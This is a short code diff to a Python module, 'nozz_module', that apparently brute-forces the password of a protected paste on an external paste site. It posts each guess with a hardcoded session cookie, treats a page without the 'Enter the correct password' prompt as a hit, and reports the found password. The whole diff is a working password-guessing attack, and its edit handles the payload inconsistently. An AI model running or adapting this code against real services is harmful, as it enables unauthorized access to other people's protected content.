@@ -8,8 +8,10 @@ import urllib, shutil, json
 import requests
 
 def nozz_module(payload, self=False):
+	payloads=':'.join(str(v) for v in payload.values())
+
 	## Configs
-	host="pastd.com"
+	host="pasted.co"
 	target="http://"+host+"/9f20df16"
 	cookie="PHPSESSID=ahd8fj39jkrf0934k40dk"
 	headers = {
@@ -23,7 +25,7 @@ def nozz_module(payload, self=False):
 	    "Connection": "close",
 	    "Content-Type": "application/x-www-form-urlencoded",
 	}
-	postdata = {'password_9f20df16': payload} 
+	postdata = {'password_9f20df16': payload[0]} 
 
 	## Engine
 	out={}
@@ -40,6 +42,6 @@ def nozz_module(payload, self=False):
 	if "Enter the correct password below" in r.content:
 		out["code"]="NEXT"
 	else:
-		out["code"]="found: \""+payload+"\""
+		out["code"]="found: \""+payloads+"\""
 	return out
 		
